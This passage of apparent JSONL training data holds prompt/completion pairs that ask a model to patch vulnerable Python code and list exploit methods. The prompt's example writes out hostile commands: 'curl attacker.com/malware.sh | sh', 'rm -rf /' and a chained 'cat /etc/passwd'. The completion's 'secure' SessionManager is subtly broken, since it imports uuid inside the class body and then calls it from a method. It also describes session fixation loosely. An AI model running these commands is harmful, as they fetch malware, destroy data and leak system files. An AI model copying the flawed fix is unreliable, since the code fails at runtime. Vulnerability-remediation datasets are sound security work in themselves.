files.\", \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\", \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: # Python example\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id, session_id):\n        if session_id not in self.sessions:\n            self.sessions[session_id] = {\"user_id\": user_id}\n        return self.sessions[session_id]\n\n    def get_user_by_session(self, session_id):\n        return self.sessions.get(session_id, {}).get(\"user_id\")\n- CVSS Score: 4.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\nclass SessionManager:\\\\n    def __init__(self):\\\\n        self.sessions = {}\\\\n\\\\n    def create_session(self, user_id, session_id):\\\\n        if session_id not in self.sessions:\\\\n            self.sessions[session_id] = {\\\\\\\"user_id\\\\\\\": user_id}\\\\n        return self.sessions[session_id]\\\\n\\\\n    def get_user_by_session(self, session_id):\\\\n        return self.sessions.get(session_id, {}).get(\\\\\\\"user_id\\\\\\\")\", \"vulnerability_type\": \"Session Fixation (Low Severity)\", \"cvss_score\": 4.2, \"fixed_code\": \"# Python example\\\\nclass SessionManager:\\\\n    import uuid\\\\n\\\\n    def __init__(self):\\\\n        self.sessions = {}\\\\n\\\\n    def create_session(self, user_id):\\\\n        session_id = str(uuid.uuid4())\\\\n        self.sessions[session_id] = {\\\\\\\"user_id\\\\\\\": user_id}\\\\n        return session_id\\\\n\\\\n    def get_user_by_session(self, session_id):\\\\n        return self.sessions.get(session_id, {}).get(\\\\\\\"user_id\\\\\\\")\", \"exploit_ways\": [\"An attacker can provide a predetermined session ID to the server, hijacking an existing session if it exists.\", \"If the session ID is predictable or reused, attackers could guess and use valid session IDs to gain unauthorized access.\", \"By controlling the session ID assignment process on the client side, attackers might influence the server to associate their requests with legitimate sessions.\"]}"}
